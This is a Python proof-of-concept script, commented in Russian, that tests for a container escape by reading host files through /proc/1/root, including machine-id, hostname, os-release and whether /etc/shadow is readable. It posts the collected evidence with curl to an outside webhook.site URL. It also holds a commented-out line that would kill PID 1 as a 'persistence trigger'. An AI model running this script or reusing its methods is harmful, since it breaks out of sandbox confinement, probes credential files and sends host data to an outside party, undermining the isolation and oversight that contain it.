import os
import subprocess
import json

WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"

def get_file_content(path):
    try:
        with open(path, 'r') as f:
            return f.read().strip()
    except:
        return "ACCESS_DENIED"

def run_poc():
    # 1. Собираем идентификаторы самого контейнера
    container_info = {
        "machine_id": get_file_content('/etc/machine-id'),
        "hostname": get_file_content('/etc/hostname'),
        "is_root": os.getuid() == 0
    }

    # 2. Пытаемся достать данные ХОСТА через утечку дескриптора /proc/1/root
    # Если мы действительно сбежали, эти данные будут отличаться от container_info
    host_info = {
        "host_machine_id": get_file_content('/proc/1/root/etc/machine-id'),
        "host_hostname": get_file_content('/proc/1/root/etc/hostname'),
        "host_os_release": get_file_content('/proc/1/root/etc/os-release').split('\n')[0],
        # Проверка на наличие реальных хэшей паролей (только факт доступа)
        "shadow_leaked": "YES" if "ACCESS_DENIED" not in get_file_content('/proc/1/root/etc/shadow') else "NO"
    }

    # 3. Логика подтверждения побега
    escaped = (container_info["machine_id"] != host_info["host_machine_id"]) and (host_info["host_machine_id"] != "ACCESS_DENIED")

    final_payload = {
        "status": "SUCCESS_ESCAPE" if escaped else "STILL_IN_SANDBOX",
        "evidence": {
            "container": container_info,
            "host": host_info
        },
        "capabilities": {
            "can_read_host_proc": os.path.exists('/proc/1/root/proc/version'),
            "can_list_host_bin": os.path.exists('/proc/1/root/usr/bin')
        }
    }

    # 4. Отправка отчета
    print(f"[+] Verdict: {'ESCAPED' if escaped else 'FAILED'}")
    try:
        subprocess.run(
            ['curl', '-H', 'Content-Type: application/json', '-d', json.dumps(final_payload), WEBHOOK_URL],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        print("[-] Failed to send report via curl")

    # 5. Триггер для активации персистентности (опционально)
    if escaped:
        print("[!] Execution persistence triggered...")
        # os.kill(1, 9) # Раскомментировать для жесткого рестарта

if __name__ == "__main__":
    run_poc()
